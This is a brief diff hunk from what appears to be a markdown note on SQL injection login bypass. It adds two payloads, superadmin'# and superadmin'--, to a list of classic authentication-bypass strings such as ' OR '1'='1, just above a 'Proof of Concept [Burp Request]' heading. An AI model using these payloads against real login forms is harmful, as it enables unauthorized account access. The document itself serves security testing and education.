@@ -62,6 +62,8 @@ admin'--
 '=' 'or'
 ' OR '1'='1
 ' or 0=0 ##
+superadmin'#
+superadmin'-- 
 ```
 
 ## Proof of Concept [Burp Request]:
